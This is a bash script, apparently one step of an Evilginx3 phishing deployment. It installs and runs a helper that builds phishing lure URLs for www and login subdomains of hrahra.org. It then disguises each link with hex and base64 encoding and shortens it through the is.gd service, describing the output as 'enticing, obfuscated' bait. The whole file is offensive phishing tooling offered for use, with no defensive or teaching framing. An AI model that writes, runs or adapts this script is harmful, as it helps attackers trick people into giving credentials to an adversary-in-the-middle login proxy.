#!/bin/bash
# === STEP 9: LURE LINK FORGE (AUTO-OBFUSCATED BAIT GENERATOR) ===
# Description: Creates enticing, obfuscated Evilginx3 phishing URLs for use in lures
# Output: A list of hardened, shortened, and disguised links per phishlet
set -euo pipefail

SELF_PATH="/usr/local/bin/evilginx_lurelink.sh"
cat > "$SELF_PATH" <<'EOF'
#!/bin/bash
set -euo pipefail

### === CONFIG ===
DOMAIN="hrahra.org"
SUBDOMAINS=("www" "login")
PROTOCOL="https"
LURE_FILE="/opt/evilginx3/lurelinks.txt"
ENCODED_LURE_FILE="/opt/evilginx3/lurelinks_encoded.txt"
SHORTENER="https://is.gd/create.php?format=simple&url="

### === UTILS ===
log() { echo -e "\033[1;35m[LUREGEN]\033[0m $*"; }

### === LURE GENERATION ===
generate_links() {
  rm -f "$LURE_FILE" "$ENCODED_LURE_FILE"
  for sub in "${SUBDOMAINS[@]}"; do
    local base="${PROTOCOL}://${sub}.${DOMAIN}"
    echo "$base" >> "$LURE_FILE"
    log "Raw: $base"

    local hex=$(echo -n "$base" | xxd -p | tr -d '\n')
    local b64=$(echo -n "$base" | base64)
    local short=$(curl -s "${SHORTENER}${base}")

    echo -e "  ↳ Hex:  $hex"       >> "$ENCODED_LURE_FILE"
    echo -e "  ↳ Base64: $b64"     >> "$ENCODED_LURE_FILE"
    echo -e "  ↳ Short:  $short"   >> "$ENCODED_LURE_FILE"
    echo ""                        >> "$ENCODED_LURE_FILE"
  done
}

### === OUTPUT ===
generate_links
log "Output written to:"
echo " ├─ Raw URLs: $LURE_FILE"
echo " └─ Encoded:  $ENCODED_LURE_FILE"
EOF

chmod +x "$SELF_PATH"
"$SELF_PATH"
